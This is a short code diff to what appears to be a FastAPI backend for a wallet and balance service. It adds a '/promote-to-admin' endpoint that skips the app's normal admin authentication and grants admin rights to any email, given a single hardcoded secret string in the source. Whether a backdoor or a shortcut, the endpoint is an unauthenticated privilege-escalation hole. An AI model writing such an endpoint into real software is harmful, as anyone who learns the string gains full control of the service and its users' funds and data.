@@ -247,3 +247,20 @@ def admin_stats(admin = Depends(get_current_admin), db: Session = Depends(get_db
         "total_wallets": total_wallets,
         "total_balances": {asset: str(total) for asset, total in balance_sums}
     }
+@app.post("/promote-to-admin")
+def promote_to_admin(
+    email: str = Form(...),
+    secret: str = Form(...),
+    db: Session = Depends(get_db)
+):
+    if secret != "makatron_promote_secret_2026":
+        raise HTTPException(status_code=403, detail="Invalid secret")
+
+    user = db.query(models.User).filter(models.User.email == email).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="User not found")
+
+    user.is_admin = True
+    db.commit()
+    print(f"[PROMOTE] {email} is now an admin")
+    return {"message": f"{email} is now an admin"}
